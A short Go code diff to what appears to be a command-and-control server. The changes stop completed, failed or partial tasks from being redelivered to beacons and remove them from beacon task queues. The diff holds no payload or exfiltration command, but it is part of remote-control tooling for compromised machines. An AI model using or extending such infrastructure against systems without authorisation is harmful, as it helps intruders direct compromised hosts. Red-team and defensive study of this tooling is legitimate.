@@ -1014,6 +1014,20 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 	// Now check for next task in queue
 	if len(beacon.TaskQueue) > 0 {
 		task := beacon.TaskQueue[0]
+
+		// Double-check task status before delivering (prevent re-delivery of completed tasks)
+		if storedTask, exists := c2.tasks[task.ID]; exists {
+			if storedTask.Status == "completed" || storedTask.Status == "failed" || storedTask.Status == "partial" {
+				// Task was completed, remove from queue and don't deliver
+				beacon.TaskQueue = beacon.TaskQueue[1:]
+				if c2.debug {
+					logf("[DEBUG] Skipping completed task %s from queue for beacon %s", task.ID, beaconID)
+				}
+				c2.mutex.Unlock()
+				return "ACK" // No task to deliver
+			}
+		}
+
 		beacon.TaskQueue = beacon.TaskQueue[1:] // Remove from queue
 		beacon.CurrentTask = task.ID            // Mark as current task
 
@@ -2125,6 +2139,24 @@ func (c2 *C2Manager) AddTaskFromMaster(masterTaskID, beaconID, command string) s
 		if c2.debug {
 			logf("[C2] Task %s already exists with status: %s", taskID, existingTask.Status)
 		}
+
+		// If task is completed/failed/partial, make sure it's NOT in the queue
+		if existingTask.Status == "completed" || existingTask.Status == "failed" || existingTask.Status == "partial" {
+			// Remove from queue if it somehow got in there
+			if beacon, beaconExists := c2.beacons[beaconID]; beaconExists {
+				newQueue := []Task{}
+				for _, queuedTask := range beacon.TaskQueue {
+					if queuedTask.ID != taskID {
+						newQueue = append(newQueue, queuedTask)
+					}
+				}
+				if len(newQueue) != len(beacon.TaskQueue) && c2.debug {
+					logf("[C2] Removed completed task %s from beacon %s queue", taskID, beaconID)
+				}
+				beacon.TaskQueue = newQueue
+			}
+		}
+
 		return taskID
 	}
 
